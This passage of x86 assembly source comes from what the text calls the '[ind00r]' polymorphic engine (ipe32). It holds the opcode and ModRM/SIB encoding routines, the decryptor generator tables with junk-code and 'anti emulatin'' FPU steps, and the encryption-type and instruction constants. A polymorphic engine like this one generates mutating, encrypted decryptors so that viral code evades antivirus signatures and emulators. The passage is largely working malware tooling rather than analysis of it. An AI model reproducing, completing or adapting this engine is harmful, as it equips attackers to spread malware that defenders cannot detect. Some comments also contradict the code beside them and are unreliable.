                ; fits in byte (-128 <= immediate >= 127). we can save 3
                ; bytes that will be 000000h or FFFFFFh anyway. :-%

                push  edx
                or    al, OP_GROUP1
                test  al, OPSIZE_32
                jz    ciORIblah

                mov   edx, [esp + 04h]
                movsx edx, dl
                cmp   edx, [esp + 04h]
                jne   ciORIblah
                inc   eax
                and   byte ptr [esp], 00h
                inc   eax        ; use byte imm, sign extended to dword
ciORIblah:      jnz   ciORInot_eax2

                pop   edx
                cmp   cl, REG_EAX or MOD_REG ; register = EAX/AX/AL?
                jnz   ciORInot_eax3          ; nope, create operation
                                             ; from group 1 (immediate ops)
                shl   bl, 03h                ; operation type
                or    bl, USE_EAX            ; opcode ?4h or ?5h
                and   al, 01h
                or    al, bl                 ; add operand size
                stosb                        ; store opcode
                jmp   ciORIwrite_imm         ; write immediate value

ciORInot_eax2:
                pop   edx
ciORInot_eax3:  stosb
ciORIcreate_rm:
                call  ciCreateOperand
ciORIwrite_imm: test  dl, dl
                jz    ciORIimm8
                test  dl, OPSIZE_16
                jnz   ciORIimm16
                pop   eax
                stosd
                jmp   ciORIexit
ciORIimm16:     pop   eax
                stosw
                jmp   ciORIexit
ciORIimm8:      pop   eax
                stosb
ciORIexit:      mov   [esp], edi
                popad
                ret
ciOpRMImm       endp

; ciCreateOperand
;
; creates MOD/RM byte and if needed SIB byte, and stores da displacement
;
; BL: register or additional opcode information
;
; CL: R/M operand. can be:
;      - register operand: REG_??? + MOD_REG
;      - memory operand, index register: REG_???
;      - memory operand, immediate addressing: MOD_DIRECT
;
; CH: second index register + scaling factor
;       REG_??? + NO_SCALE / SCALE_2/4/8
;       (use random value < SCALE_RND, to get random register & scaling).
;       if this byte is zero, no SIB byte is used.
;       take special care when using no scaling factor (logical or with
;       NO_SCALE)
;
; ESI: displacement
;    if this is zero, no displacement is used.
;    when usin' direct addressing (MOD_DIRECT), this register contains
;    immediate memory address.
;    if ESI is in the range between -128 and 127, 8-bit displacement is
;    used. when you're using 8-bit displacements calculate them like this:
;    movsx esi, rm8          ; rm8 = 8-bit register or memory operand
;                            ; containing 8-bit displacement.
;    this check isn't performed when MOD_DISP8 or MOD_DISP32
;
ciCreateOperand proc
                pushad
                mov   eax, ecx
                and   al, MOD_REG
                cmp   al, MOD_REG          ; R/M operand = register?
                jz    COcreate_mr          ; yes, directly to ciCreateMODRM
                test  cl, MOD_DIRECT       ; direct addressing?
                jnz   COno_disp
                mov   eax, esi
                test  eax, eax             ; displacement = 0?
                jz    COno_disp            ; don't use displacement
                or    cl, MOD_DISP32       ; set 32-bit displacement
                test  cl, MOD_DIRECT
                jnz   COno_disp
                movsx eax, al
                cmp   eax, esi
                jne   COno_disp
                xor   cl, MOD_REG
COno_disp:      test  ch, ch               ; second index register?
                jz    COcreate_mr          ; no, we don't need SIB
                or    cl, MOD_SIB          ; set SIB flag
COcreate_mr:
; create MOD/RM byte
;
; BL = register or additional opcode information (bits 3, 4, 5)
; CL = register or memory operand (bits 0,1,2)
;      - register operand: REG_??? + MOD_REG
;      - memory operand, no displacement: REG_??? + MOD_NODISP
;      - memory operand, 8-bit displacement: REG_??? + MOD_DISP8
;      - memory operand, 32-bit displacement: REG_??? + MOD_DISP32
;      - memory operand, immediate addressing: MOD_DIRECT
;      - sib memory operand, no displacement: MOD_SIB + MOD_NODISP
;      - sib memory operand, 8-bit displacement: MOD_SIB + MOD_DISP8
;      - sib memory operand, 32-bit displacement: MOD_SIB + MOD_DISP32
;      - sib memory operand, immediate addressing: MOD_DIRECT + MOD_SIB
;
; output:
;
; AL = displacement size:
;        MOD_NODISP
;        MOD_DISP8
;        MOD_DISP32
;        MOD_DIRECT
;        MOD_SIB         ; if MOD_SIB the lower 3 bits are base register
;
; [EBP] with no displacement is immediate addressing. if you want [EBP],
; this procedure generates zero 8-bit displacement. if you want immediate
; address use MOD_DIRECT.
;
; [ESP] normally indicates that SIB byte follows. when you use [ESP] this
; procedure generates SIB byte (24h). when you want to use SIB byte, use
; MOD_SIB.
;
; if no displacement, sib byte and [ebp] as base, zero 8-bit displacement
; is used if MOD_DIRECT + MOD_SIB, immediate address is used as base...
; AL = MOD_NODISP, MOD_DISP8 or MOD_DISP32 (or MOD_SIB if sib)
; CL = base
;         REG_???
; CH = index
;         REG_??? (not ESP) + NOSCALE/SCALE_2/4/8
;
; AL = MOD_NODISP, MOD_DISP8 or MOD_DISP32 (or MOD_SIB if sib)

                shl   ebx, 03h             ; register
                ; let's check if operand is register

                mov   eax, ecx
                and   al, MOD_REG          ; clear bits 0-5
                xor   al, MOD_REG          ; invert bit 6 & 7
                jnz   CMblah1              ; memory operand.
                xchg  eax, ecx
                and   al, 0C7h
                or    eax, ebx
                stosb                      ; directly create it!
                xor   eax, eax             ; return MOD_NODISP
                jmp   CMexit1
CMblah1:        mov   eax, ecx
                and   al, 0C7h
                cmp   al, REG_EBP          ; EBP and no displacement?
                jnz   CMblah2
                or    cl, MOD_DISP8        ; use 8-bit displacement
CMblah2:        mov   eax, ecx
                and   al, 07h or MOD_DIRECT or MOD_SIB
                cmp   al, REG_ESP          ; ESP is index reg?
                jnz   CMblah3              ; nope
                or    eax, ebx
                and   cl, MOD_REG
                or    eax, ecx
                stosb
                mov   byte ptr [edi], 24h
                inc   edi
                and   al, MOD_REG
                jmp   CMexit1
CMblah3:        mov   eax, ecx
                test  al, MOD_DIRECT       ; direct addressing?
                jz    CMblah4              ; nope
                and   cl, 38h
                or    cl, REG_EBP          ; no displacement and EBP
CMblah4:        mov   eax, ecx
                test  al, MOD_SIB          ; do we have SIB byte?
                jz    CMblah6              ; no SIB byte

                ; set ESP as index register (SIB)

                and   al, 0C0h or MOD_SIB or MOD_DIRECT
                or    al, REG_ESP
                and   cl, 0C7h or MOD_SIB or MOD_DIRECT
CMblah6:        and   al, 0C7h
                or    eax, ebx
                stosb
                mov   eax, ecx
                and   al, 0C7h or MOD_SIB or MOD_DIRECT
CMexit1:
                ; created MOD/RM byte. now let's do the displacement

                test  eax, eax             ; no displacement?
                jz    COexit               ; yes, exit
                test  al, MOD_SIB          ; SIB byte?
                jz    COblah               ; no, don't store SIB byte
                shl   ch, 03h              ; creatin' SIB byte
                push  eax                  ; preserving addressing mode
                and   al, REG_RND - 1      ; mask base register
                or    al, ch
                stosb                      ; store SIB byte
                pop   eax
COblah:         test  al, MOD_DIRECT       ; direct addressing?
                jnz   COdirect             ; yes, store VA & exit
COblah2:        test  al, MOD_DISP8        ; do we have 8-bit displacement?
                jz    COblah3              ; no, perform next check
                xchg  esi, eax
                stosb
                jmp   COexit
COblah3:        test  al, MOD_DISP32
                jz    COexit
COdirect:       xchg  esi, eax
                stosd
COexit:         mov   [esp], edi
                popad
                ret
ciCreateOperand endp
; initialized data
                db    '[ind00r] polymorphic engine by slurp', 0

; decryptor instructions generator addresses (relative to idelta)
Generatorz      dd    offset iProcLdPtr - idelta     ; load pointer
                dd    offset iProcLdCnt - idelta     ; load counter
                dd    offset iProcLdKey - idelta     ; load key
                dd    offset iProcDecData - idelta   ; decrypt data
                dd    offset iProcIncKey - idelta    ; increment key
                dd    offset iProcIncPtr - idelta    ; increment pointer
                dd    offset iProcDecCnt - idelta    ; decrement counter
                dd    offset iProcFPUFool - idelta   ; neat stuff :O
; junk instruction generator addresses (relative to idelta)

JunkGen         dd    offset iMemJunk - idelta
                dd    offset iRegJunk - idelta
JUNKGEN_CNT     equ   02h

; decryptor procedures are called in this order:
CallOrder1      db    LOAD_POINTER               ; ┐
                db    LOAD_COUNTER               ; ├ these procedures can
                db    LOAD_KEY                   ; ┘ be mixed.
CALL_ORDER_1    equ   $ - CallOrder1
                db    DECRYPT_DATA      ; stays at its place
CALL_ORDER_2    equ   $ - CallOrder1
CallOrder2      db    INC_KEY                    ; ┐
                db    INC_POINTER                ; ├ these procedures can
                db    DEC_COUNTER                ; │ be mixed.
                db    FPU_FOOL                   ; │
                db    JUNK_PROCS dup (JUNK_PROC) ; ┘

; procedure order (1 byte for each procedures that will be mixed randomly)
ProcedureOrder  db    LOAD_POINTER
                db    LOAD_COUNTER
                db    LOAD_KEY
                db    DECRYPT_DATA
                db    INC_KEY
                db    INC_POINTER
                db    DEC_COUNTER
                db    FPU_FOOL
                db    JUNK_PROCS dup (JUNK_PROC)
PROC_ORDER      equ   $ - ProcedureOrder

; registerz
Registers       equ   $
preg            db    REG_ECX           ; pointer register
creg            db    REG_EDX           ; counter register
kreg            db    REG_EAX           ; key register
junkreg1        db    REG_EBX           ; junk register 1
junkreg2        db    REG_ESI           ; junk register 2
junkreg3        db    REG_EDI           ; junk register 3
USED_REGS       equ   $ - Registers

RandomConst     dd    RANDOM_SEED       ; random seed constant (unchanged
                                        ; during runtime)
idelta          equ   $                 ; delta offset (held in ebp)

; uninitialized data

RandomSeed      dd    ?                 ; random seed (changed)

InitValues      equ   $                 ; some values we have to initialize
JunkSpSize      dd    ?                 ; size of junk space
JunkSpRVA       dd    ?                 ; address of junk space
DecryptRVA      dd    ?                 ; address of encrypted code
CryptSize       dd    ?                 ; size of crypted code
EncryptRVA      dd    ?                 ; address of code to encrypt
CryptKey        dd    ?                 ; encryption key
KeyIncrement    dd    ?                 ; key incrementation
CryptType       db    ?                 ; encryption type (byte)
KeyIncType      db    ?                 ; key increment type (byte)

ProcParameters   db    MAX_PROCS + 1 dup (?)
ProcAddress      dd    MAX_PROCS + 1 dup (?)

JunkProcs       db    ?                 ; number of junk procedures
ProcCount       db    ?                 ; number of procedures

CurrentProc     db    ?                 ; identifies current procedure when
                                        ; in the generator loop.
InLoop          db    ?                 ; boolean, if true we are
                                        ; generating decryptor loop
nojunk          db    ?
; procedure number constantz
LOAD_POINTER    equ   00h
LOAD_COUNTER    equ   01h
LOAD_KEY        equ   02h
DECRYPT_DATA    equ   03h
INC_KEY         equ   04h               ; increment key
INC_POINTER     equ   05h               ; increment pointer by 4
DEC_COUNTER     equ   06h               ; decrement counter by 1
FPU_FOOL        equ   07h               ; some anti emulatin' stuff
JUNK_PROC       equ   08h
MAX_PROCS       equ   JUNK_PROC + JUNK_PROCS + 1
MIN_PROCS       equ   JUNK_PROC + 1
JUNK_PROCS      equ   04h               ; maximal junk procedure count - 1

MAX_PARAMS      equ   04h               ; maximal number of parameters

; encryption type constantz
ENC_XOR       equ 00000000b             ; xor encryption
ENC_ADD       equ 00000001b             ; add encryption
ENC_SUB       equ 00000010b             ; sub encryption
ENC_ROL       equ 00000011b             ; rol encryption
ENC_ROR       equ 00000100b             ; ror encryption
ENC_RND       equ 5

; key increment type constantz
KEY_INC       equ 00000000b             ; rol key with random value
KEY_DEC       equ 00000001b             ; ror key with random value
KEY_ROL       equ 00000010b             ; inc key with random value
KEY_ROR       equ 00000011b             ; dec key with random value
KEY_RND       equ 4
; i386 instruction set constants
; correct order of register on stack after a pushad. offset relative
; to ESP
PUSHAD_EAX      equ   (REG_EDI - REG_EAX) * 4      ; location of EAX
PUSHAD_ECX      equ   (REG_EDI - REG_ECX) * 4      ; location of ECX
PUSHAD_EDX      equ   (REG_EDI - REG_EDX) * 4      ; location of EDX
PUSHAD_EBX      equ   (REG_EDI - REG_EBX) * 4      ; location of EBX
PUSHAD_ESP      equ   (REG_EDI - REG_ESP) * 4      ; location of ESP
PUSHAD_EBP      equ   (REG_EDI - REG_EBP) * 4      ; location of EBP
PUSHAD_ESI      equ   (REG_EDI - REG_ESI) * 4      ; location of ESI
PUSHAD_EDI      equ   (REG_EDI - REG_EDI) * 4      ; location of EDI
PUSHAD_SIZE     equ   8 * 04h                      ; size of pushad record

; dword registerz
REG_EAX         equ   00000000b
REG_ECX         equ   00000001b
REG_EDX         equ   00000010b
REG_EBX         equ   00000011b
REG_ESP         equ   00000100b
REG_EBP         equ   00000101b
REG_ESI         equ   00000110b
REG_EDI         equ   00000111b

; word registerz
REG_AX          equ   00000000b
REG_CX          equ   00000001b
REG_DX          equ   00000010b
REG_BX          equ   00000011b
REG_SP          equ   00000100b
REG_BP          equ   00000101b
REG_SI          equ   00000110b
REG_DI          equ   00000111b

; byte registerz
REG_AL          equ   00000000b
REG_CL          equ   00000001b
REG_DL          equ   00000010b
REG_BL          equ   00000011b
REG_AH          equ   00000100b
REG_CH          equ   00000101b
REG_DH          equ   00000110b
REG_BH          equ   00000111b

; fpu registerz
REG_ST0         equ   00000000b
REG_ST1         equ   00000001b
REG_ST2         equ   00000010b
REG_ST3         equ   00000011b
REG_ST4         equ   00000100b
REG_ST5         equ   00000101b
REG_ST6         equ   00000110b
REG_ST7         equ   00000111b

REG_RND         equ   REG_EDI + 1

; jump opcode constantz
JMP_SHORT       equ   0EBh
JMP_LONG        equ   0E9h
JMPC_SHORT      equ   070h
JMPC_LONG       equ   080h              ; 2 byte opcode!

; conditions

COND_C          equ   002h            ; carry
COND_NC         equ   003h            ; no carry
COND_E          equ   004h            ; equal                   A  = B
COND_NE         equ   005h            ; not equal               A != B
COND_Z          equ   004h            ; zero                    A  = B
COND_NZ         equ   005h            ; not zero                A != B
COND_S          equ   008h            ; sign                   msb = 1
COND_NS         equ   009h            ; no sign                msb = 0
COND_P          equ   00Ah            ; parity even            lsb = 0
COND_NP         equ   00Bh            ; parity odd             lsb = 1
COND_O          equ   000h            ; overflow       msb was toggled
COND_NO         equ   001h            ; no overflow    msb wasn't toggled

COND_B          equ   COND_C          ; below                    A > B
COND_NAE        equ   COND_B          ; neither above or equal   A > B
COND_NB         equ   COND_NC         ; not below                A ≤ B
COND_AE         equ   COND_NB         ; above or equal           A ≤ B
COND_BE         equ   006h            ; below or equal           A ≥ B
COND_NA         equ   COND_BE         ; not above                A ≥ B
COND_NBE        equ   007h            ; neither below or equal   A < B
COND_A          equ   COND_NBE        ; above                    A < B
COND_L          equ   00Ch            ; less                     A > B
COND_NGE        equ   COND_L          ; neither greater or equal A > B
COND_NL         equ   00Dh            ; not less                 A ≤ B
COND_GE         equ   COND_NL         ; greater or equal         A ≤ B
COND_LE         equ   00Eh            ; less or equal            A ≥ B
COND_NG         equ   COND_LE         ; not greater              A ≥ B
COND_NLE        equ   00Fh            ; neither less or equal    A < B
COND_G          equ   COND_NLE        ; greater                  A < B

; call opcode constantz
CALL_DIRECT     equ   0E8h

; procedure commands
PROC_ENTER      equ   0C8h
PROC_LEAVE      equ   0C9h
PROC_RETP       equ   0C2h
PROC_RET        equ   0C3h
MOV_EBP_ESP     equ   0EC8Bh

; stack opcodes
PUSH_REG        equ   050h                 ; xor REG_???
POP_REG         equ   058h
PUSH_IMM        equ   068h
PUSH_IMM_SX     equ   06Ah
POP_MEM         equ   08Fh

; increment/decrement opcodes
INC_REG         equ   040h
DEC_REG         equ   048h
INCDEC_GROUP    equ   0FEh

; mov opcodes
MOV_REG_RM      equ   0
MOV_REG_IMM     equ   0B0h ; mov register, immediate
MOV_REG_IMM8    equ   0B0h
MOV_REG_IMM32   equ   0B8h
MOV_MEM_IMM     equ   0C6h ; mov memory, immediate

; extended mov opcodes

MOVX            equ   0B6h
MOVX_BYTE       equ   000h
MOVX_WORD       equ   001h
MOVX_ZX         equ   000h
MOVX_SX         equ   008h

; load effective address
LOAD_EA         equ   08Dh

; Flag set/clear commands
CLR_CRY         equ   0F8h
SET_CRY         equ   0F9h
CLR_INT         equ   0FAh
SET_INT         equ   0FBh
CLR_DIR         equ   0FCh
SET_DIR         equ   0FDh

; Common opcode constants

; prefixes
ESC_2BYTE       equ   0Fh
OPERAND_SIZE    equ   66h
ADDRESS_SIZE    equ   67h

; segment override prefix
OVERRIDE_FS     equ   64h
OVERRIDE_GS     equ   65h

; operand size
OPSIZE_8        equ   00h
OPSIZE_32       equ   01h
OPSIZE_16       equ   02h

; direction
MEM_REG         equ   00h
REG_MEM         equ   01h

; some opcodes support direct EAX/AX/AL access
USE_EAX         equ   04h

XCHG_EAX_REG    equ    090h ; add register number to get opcode (not eax)
OP_NOP          equ    090h ; very obsolete :x<
TEST_EAX_IMM    equ    0A8h

; Shift operation constants
OP_SHIFT        equ    0C0h

SHIFT_IMM       equ    000h ; shift immediate
SHIFT_1         equ    001h ; shift 1 time
SHIFT_CL        equ    002h ; shift cl times
SHIFT_RND       equ    003h ; for choosing random shift.

ROL_SHIFT       equ    000h
ROR_SHIFT       equ    001h
RCL_SHIFT       equ    002h
RCR_SHIFT       equ    003h
SHL_SHIFT       equ    004h
SHR_SHIFT       equ    005h
SAR_SHIFT       equ    006h
RND_SHIFT       equ    007h

OP_GROUP1       equ    080h ; opcode for immediate group 1
OP_GROUP3       equ    0F6h ; opcode for shift group 3

; jmp, call, push, inc, dec group
OP_GROUP5       equ    0FFh ; opcode for jmpcallpushincdec group 5

P_INC           equ    000h
P_DEC           equ    001h
P_CALL_NEAR     equ    002h  ; call dword ptr
P_CALL_FAR      equ    003h  ; call 48-bit ptr
P_JMP_NEAR      equ    004h  ; jmp dword ptr
P_JMP_FAR       equ    005h  ; jmp 48-bit ptr
P_PUSH          equ    006h

; Math operation constants
OPTYPE_ADD      equ   00h
OPTYPE_OR       equ   01h
OPTYPE_ADC      equ   02h
OPTYPE_SBB      equ   03h
OPTYPE_AND      equ   04h
OPTYPE_SUB      equ   05h
OPTYPE_XOR      equ   06h
OPTYPE_CMP      equ   07h
OPTYPE_MOV      equ   008h
OPTYPE_TEST     equ   009h
OPTYPE_XCHG     equ   00Ah

; Math opcode constants
MATH_ADD        equ   OPTYPE_ADD shl 03h
MATH_OR         equ   OPTYPE_OR  shl 03h
MATH_ADC        equ   OPTYPE_ADC shl 03h
MATH_SBB        equ   OPTYPE_SBB shl 03h
MATH_AND        equ   OPTYPE_AND shl 03h
MATH_SUB        equ   OPTYPE_SUB shl 03h
MATH_XOR        equ   OPTYPE_XOR shl 03h
MATH_CMP        equ   OPTYPE_CMP shl 03h

; Immediate opcode constants
IMM_OP          equ   80h
IMM_SX          equ   03h               ; sign extended immediate

; MOD/RM constants

; MOD bits
MOD_NODISP      equ   000h                  ; no displacement
MOD_DISP8       equ   040h                  ; 8-bit displacement
MOD_DISP32      equ   080h                  ; 32-bit displacement
MOD_REG         equ   0C0h                  ; register
_MOD            equ   011000000b            ; mask for MOD-field

MOD_DIRECT      equ   00001000b                 ; use immediate address
MOD_SIB         equ   00010000b                 ; use sib byte

; REG bits
_REG            equ   000111000b            ; mask for REG-field

; RM bits
RM_DIRECT       equ   REG_EBP xor MOD_NODISP
RM_SIB          equ   REG_ESP
_RM             equ   000000111b            ; mask for RM field

; FPU opcodes

FPU_OPCODE      equ   0D8h
FPU_DWORD_OP    equ   0D8h   ; dword ops/fpu reg ops
FPU_DWORD_LDST  equ   0D9h   ; group 1 - 4, FLD, FST, ...
FPU_INT_OP      equ   0DAh   ; dword operations
FPU_INT_LDST    equ   0DBh   ; group 5, FILD, FIST
FPU_QWORD_OP    equ   0DCh   ; qword ops/fpu reg ops
FPU_QWORD_LDST  equ   0DDh   ; qword FILD, FIST
FPU_WORD_OP     equ   0DEh   ; word ops (only mem), and reversed arithmetix
FPU_WORD_LDST   equ   0DFh   ; word FILD, FIST

; FPU opcode + MOD/RM (bl = FPU_FMUL, FDIV...)
;
; they'll fit to the following opcodez:
; FPU_DWORD_OP, FPU_QWORD_OP & FPU_WORD_OP
; IMPORTANT: note that the word operations won't work with fpu registers!

FPU_ADD        equ   000b                   ; MOD/RM bit 3,4,5 = 001
FPU_MUL        equ   001b
FPU_CMP        equ   010b
FPU_COMP       equ   011b
FPU_SUB        equ   100b
FPU_SUBR       equ   101b
FPU_DIV        equ   110b
FPU_DIVR       equ   111b

; FPU_WORD_OP group contains some opcodes with reversed register order.
; this means first comes st(?) and then the first register.
FPU_ADDP       equ   000b                   ; MOD/RM bit 3,4,5 = 001
FPU_MULP       equ   001b
FPU_COMPP      equ   011b
FPU_SUBRP      equ   100b
FPU_SUBP       equ   101b
FPU_DIVRP      equ   110b
FPU_DIVP       equ   111b

FPU_DIR1        equ   000h                     ; direction st, st(?)
FPU_DIR2        equ   004h                     ; direction st(?), st

; FPU stand alone instructions
FPU_INIT        equ   0E3DBh
FPU_SQRT        equ   0FAD9h

FPU_LD1         equ   0E8D9h
FPU_LDL2T       equ   0E9D9h
FPU_LDL2E       equ   0EAD9h
FPU_LDPI        equ   0EBD9h
FPU_LDLG2       equ   0ECD9h
FPU_LDLN2       equ   0EDD9h
FPU_LDZ         equ   0EED9h

FPU_WAIT        equ   09Bh

FPU_STORE       equ   02h
FPU_LOAD        equ   00h
; end of ipe32
